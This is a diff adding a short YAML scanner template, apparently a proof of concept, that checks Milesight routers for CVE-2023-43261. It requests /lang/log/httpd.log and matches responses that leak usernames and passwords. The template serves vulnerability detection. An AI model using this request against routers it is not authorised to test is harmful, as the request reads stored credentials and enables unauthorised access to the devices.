@@ -1,0 +1,15 @@
+id: poc-yaml-milesight-routers-information-disclosure
+info:
+  name: Milesight 路由信息泄露漏洞(CVE-2023-43261)
+  severity: high
+  tags:
+  - CVE-2023-43261
+  - 信息泄露
+  finger: milesight
+requests:
+- method: GET
+  path: /lang/log/httpd.log
+  expression: status_code == 200 && contains(body,"\"status\":\"success\"") && (contains(body,"password")
+    && contains(body,"username"))
+variables: {}
+transport: http
